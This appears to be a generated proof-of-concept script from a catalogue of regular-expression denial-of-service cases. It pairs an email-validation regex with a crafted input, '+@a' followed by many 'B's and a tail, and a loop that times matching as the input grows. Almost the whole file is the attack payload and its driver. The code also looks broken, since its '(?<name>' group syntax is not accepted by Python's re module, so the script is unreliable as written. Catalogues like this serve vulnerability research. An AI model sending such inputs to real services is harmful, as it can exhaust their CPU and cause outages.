# 5850
# (?<username>#?[+_a-zA-Z0-9+-]+(\.[+_a-zA-Z0-9+-]+)*)@(?<domain>[a-zA-Z0-9]+(-(?!-)|[a-zA-Z0-9\.])*?[a-zA-Z0-9]+\.([0-9]{1,3}|[a-zA-Z]{2,3}|(aero|arpa|asia|coop|info|jobs|mobi|museum|name|travel)))
# EXPONENT
# nums:4
# EXPONENT AttackString:"+@a"+"B"*512+"! _1!\n_SLQ_3"

import re
from time import perf_counter

regex = """(?<username>#?[+_a-zA-Z0-9+-]+(\.[+_a-zA-Z0-9+-]+)*)@(?<domain>[a-zA-Z0-9]+(-(?!-)|[a-zA-Z0-9\.])*?[a-zA-Z0-9]+\.([0-9]{1,3}|[a-zA-Z]{2,3}|(aero|arpa|asia|coop|info|jobs|mobi|museum|name|travel)))"""
REGEX = re.compile(regex)
for i in range(0, 150000):
    ATTACK = "+@a" + "B" * i * 1 + "! _1!\n_SLQ_3"
    LEN = len(ATTACK)
    BEGIN = perf_counter()
    m = REGEX.search(ATTACK)
    # m = REGEX.match(ATTACK)
    DURATION = perf_counter() - BEGIN
    print(f"{i *1}: took {DURATION} seconds!")